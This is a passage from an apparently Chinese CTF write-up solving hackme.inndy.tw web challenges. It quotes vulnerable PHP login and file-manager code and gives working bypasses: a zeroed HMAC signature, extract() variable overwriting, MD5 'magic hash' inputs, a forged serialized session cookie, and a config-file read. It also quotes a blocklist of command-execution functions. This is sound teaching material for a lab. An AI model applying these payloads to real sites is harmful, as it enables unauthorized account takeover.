class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'users_db.php'</span>); <span class="comment">// $users</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">($user_data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line"></span><br><span class="line">    $user = [$user_data[<span class="string">'name'</span>], $user_data[<span class="string">'admin'</span>]];</span><br><span class="line"></span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = hash_hmac(<span class="string">'sha512'</span>, $data, $secret);</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    setcookie(<span class="string">'user'</span>, $all, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$error = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $unserialized = json_decode(base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// == 可能绕过</span></span><br><span class="line">    <span class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = json_decode($unserialized[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $data[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $data[<span class="number">1</span>]</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = load_user();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($users <span class="keyword">as</span> $u) &#123;</span><br><span class="line">        <span class="keyword">if</span>($u[<span class="string">'name'</span>] === $_POST[<span class="string">'name'</span>] &amp;&amp; $u[<span class="string">'password'</span>] === $_POST[<span class="string">'password'</span>]) &#123;</span><br><span class="line">            set_user($u);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先用 <code>guest</code> 登录玩玩，<code>cookie</code> 中多了一个 <code>user</code> 的值。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eyJzaWciOiI<span class="number">3</span><span class="symbol">NWQ1</span><span class="name">M2</span>Y<span class="number">5</span><span class="symbol">N2</span>FjZDIxMTA<span class="number">5</span>OGEw<span class="symbol">NTJiMzA1</span>ZDFjYWYxOTE<span class="number">0</span>MzZj<span class="symbol">NmQyOWQxOTM2</span>ZDk<span class="number">0</span><span class="symbol">N2</span>Y<span class="number">4</span>ZmRl<span class="symbol">NzczMzAwOGEzOTY4</span>ZWRhYTRi<span class="symbol">NGE2</span>ODI<span class="number">0</span>MmRiODY<span class="number">5</span><span class="symbol">NjAzMDUwNTI3</span>Mzkx<span class="symbol">NGRlZDY4</span>OGQ<span class="number">0</span><span class="symbol">NTllOGM5</span>MjI<span class="number">1</span>MjAwZDcyOWEwYjk<span class="number">4</span>ZSIsImRhdGEiOiJbXCJ<span class="symbol">ndWVzdFwiLGZhbHNlXSJ9</span></span><br><span class="line"></span><br><span class="line">base<span class="number">64</span>_decode =&gt;</span><br><span class="line">&#123;<span class="string">"sig"</span>:<span class="string">"75d53f97acd211098a052b305d1caf191436c6d29d1936d947f8fde7733008a3968edaa4b4a68242db8696030505273914ded688d459e8c9225200d729a0b98e"</span>,<span class="string">"data"</span>:<span class="string">"[\"guest\",false]"</span>&#125;</span><br></pre></td></tr></table></figure><p><code>hmac</code> 验证 <code>data</code> 是否被篡改，可惜用的是 <code>!=</code> ，将自动进行类型转换，我们将 <code>sig</code> 的值设为 0 即可。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"sig"</span>:<span class="number">0</span>,<span class="string">"data"</span>:<span class="string">"[\"</span><span class="number">1</span>\<span class="string">",1]"</span>&#125;  // 第二个值为 <span class="literal">true</span> 即可</span><br><span class="line"></span><br><span class="line"><span class="attr">base64_encode</span> =&gt;</span><br><span class="line"><span class="attr">eyJzaWciOjAsImRhdGEiOiJbXCIxXCIsMV0ifQ==</span></span><br><span class="line"></span><br><span class="line">需要注意的是，这里 data 里的值也不能完全瞎弄，hash 结果如果以数字开头，则过不了，以字母开头才能过 <span class="keyword">if</span></span><br></pre></td></tr></table></figure><h2 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a><a href="https://hackme.inndy.tw/login4" target="_blank" rel="noopener">login as admin 4</a></h2><p>这一块有逻辑问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>): <span class="comment">/* login success! */</span> <span class="meta">?&gt;</span></span><br><span class="line">      &lt;div class="alert alert-success"&gt;&lt;code&gt;&lt;?=$flag?&gt;&lt;/code&gt;&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="login-as-admin-6"><a href="#login-as-admin-6" class="headerlink" title="login as admin 6"></a><a href="https://hackme.inndy.tw/login6" target="_blank" rel="noopener">login as admin 6</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="comment">// 变量覆盖</span></span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!$user &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-danger"&gt;Login failed&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">            &lt;h3&gt;Hi, <span class="meta">&lt;?</span>=htmlentities($username)<span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">            &lt;h4&gt;<span class="meta">&lt;?</span>=sprintf(<span class="string">"You %s admin!"</span>, $user == <span class="string">'admin'</span> ? <span class="string">"are"</span> : <span class="string">"are not"</span>)<span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">if</span>($user == <span class="string">'admin'</span>) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;"</span>, htmlentities($flag)); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到 <code>extract</code> 基本上就是变量覆盖的洞了。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>=&#123;<span class="string">"user"</span>:<span class="string">"admin"</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a><a href="https://hackme.inndy.tw/login7" target="_blank" rel="noopener">login as admin 7</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'name'</span>] == <span class="string">'admin'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'00000000000000000000000000000000'</span>)&#123;</span><br><span class="line">    <span class="comment">// admin account is disabled by give a impossible md5 hash</span></span><br><span class="line">    $user = <span class="string">'admin'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>($_POST[<span class="string">'name'</span>] == <span class="string">'guest'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'084e0343a0486ff05530df6c705c8bb4'</span>) &#123;</span><br><span class="line">    $user = <span class="string">'guest'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型比较 + 魔法哈希</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'0e0'</span> == <span class="string">'0000'</span>);  <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e73119806149116307319712</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br></pre></td></tr></table></figure><h2 id="login-as-admin-8"><a href="#login-as-admin-8" class="headerlink" title="login as admin 8"></a><a href="https://hackme.inndy.tw/login8" target="_blank" rel="noopener">login as admin 8</a></h2><p>给出的核心代码就这些，剩下的要靠自己慢慢找了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'session.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// class Session &#123; ... &#125;</span></span><br><span class="line"><span class="comment">// sorry, no source code this time. :P</span></span><br><span class="line"></span><br><span class="line">$session = Session::load();</span><br><span class="line">$login_failed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    $session-&gt;debug();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $login_failed = !Session::login($_POST[<span class="string">'name'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'logout'</span>])) &#123;</span><br><span class="line">    $session = <span class="keyword">new</span> Session();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session-&gt;save();</span><br></pre></td></tr></table></figure><p><code>cookie</code> 里有点东西，<strong>login8cookie</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span><span class="number">%3</span>A7<span class="number">%3</span>A<span class="number">%22</span>Session<span class="number">%22</span><span class="number">%3</span>A6<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A14<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>Session<span class="number">%00</span>debug<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A0<span class="number">%3</span>Bs<span class="number">%3</span>A19<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>Session<span class="number">%00</span>debug_dump<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A9<span class="number">%3</span>A<span class="number">%22</span>index.php<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A13<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>Session<span class="number">%00</span>data<span class="number">%22</span><span class="number">%3</span>Ba<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%7</span>B<span class="number">%7</span>Ds<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>user<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%22</span><span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>pass<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%22</span><span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A8<span class="number">%3</span>A<span class="number">%22</span>is_admin<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A0<span class="number">%3</span>B<span class="number">%7</span>D</span><br></pre></td></tr></table></figure><p><strong>login8sha512</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>feb<span class="number">33685e47</span><span class="keyword">c</span><span class="number">83</span>ce<span class="number">089</span>b<span class="number">1707</span>f<span class="number">270001</span>a<span class="number">8</span>dc<span class="number">0648</span>d<span class="number">4</span>a<span class="number">7</span>d<span class="number">94</span>d<span class="number">0</span>a<span class="number">3e2</span>f<span class="number">5</span>b<span class="number">35803</span>a<span class="number">7</span><span class="keyword">c</span><span class="number">8766285283415</span><span class="keyword">c</span><span class="number">8594e658468</span>cf<span class="number">5e99</span>be<span class="number">232</span>b<span class="number">3</span>bf<span class="number">98</span>a<span class="number">441568</span>a<span class="number">71</span>f<span class="number">709243e9077</span></span><br></pre></td></tr></table></figure><p>发现，<code>sha512</code> 的值直接是 <code>cookie</code> 的杂凑值，没有加密，没有加盐，同时改就 OK 了。</p><p>需要注意的是，不能 URL 解码后直接复制去 hash，这样会丢失一些不可见字符 <code>%00</code>。</p><h2 id="login-as-admin-8-1"><a href="#login-as-admin-8-1" class="headerlink" title="login as admin 8.1"></a><a href="https://hackme.inndy.tw/login8" target="_blank" rel="noopener">login as admin 8.1</a></h2><blockquote><p>login as admin and grab the hidden flag</p></blockquote><p>注意到上面的 <code>cookie</code> 中还有 <code>debug</code> 选项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, urllib.parse</span><br><span class="line">en = <span class="string">"""O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A1%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A10%3A%22config.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D"""</span></span><br><span class="line">print(hashlib.sha512((urllib.parse.unquote(en)).encode()).hexdigest())</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2lo6mueh3j20jv08nglt.jpg" alt></p><h2 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 1</a></h2><blockquote><p>Login as guest and find flag 1</p></blockquote><p><code>guest</code> 登录看看，发现是一个文件管理系统，还给了源码。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2lodixl9mj20vf0hn0v5.jpg" alt></p><h2 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 2</a></h2><blockquote><p>Try to login as admin! and you will get flag2</p></blockquote><p>先简单的审计一番，发现并没用到数据库，用户信息是用文件存储的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"guest"</span>, </span><br><span class="line">        <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, </span><br><span class="line">        <span class="string">"./data/guest"</span>, </span><br><span class="line">        <span class="string">"https://game1.security.ntu.st/data/guest"</span>, </span><br><span class="line">        <span class="number">0</span>, </span><br><span class="line">        <span class="string">"^.ht"</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span></span><br><span class="line">    ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>没数据库就不需要考虑 <code>sqli</code> 了，直接想办法读文件。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2m7vaxjiqj20sl07t75a.jpg" alt></p><p>敏感函数大致在这，一个一个看下。</p><p><strong>fun_down.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断文件是否存在</span></span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line"><span class="comment">// 跟进 get_show_item</span></span><br><span class="line"><span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="comment">// 这个判断太弱了，不用管</span></span><br><span class="line"><span class="keyword">if</span> ($GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span>) &#123;  <span class="comment">// show_hidden=1</span></span><br><span class="line">    $dirs = explode(<span class="string">"/"</span>, $dir);</span><br><span class="line">    <span class="keyword">foreach</span> ($dirs <span class="keyword">as</span> $i) <span class="keyword">if</span> (substr($i, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 形成完整路径</span></span><br><span class="line">$abs_item = get_abs_item($dir, $item);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里判断了是否有 .php / config，不太好过，再去看看其他点</span></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p><strong>fun_edit.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里没了之前那个刺头</span></span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line"></span><br><span class="line">$fname = get_abs_item($dir, $item);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($fname)) </span><br><span class="line">    show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p>可以先尝试读取 <code>index.php</code> ，确定好相对路径后再读这个配置文件。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2m8dzr3brj20yo0j3djb.jpg" alt></p><p>用管理员账号登录即可看到 flag。</p><h2 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 3</a></h2><blockquote><p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p></blockquote><p>之前看源码的时候，留意到一个 <code>debug</code> 的地方，而且也扫出来了 <code>eval</code>。</p><p>定位到 <code>fun_debug.php</code> ，也可以尝试下传个 <code>webshell</code>上去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="comment">// 传个数组过了</span></span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;  <span class="comment">// 过滤太弱了</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span 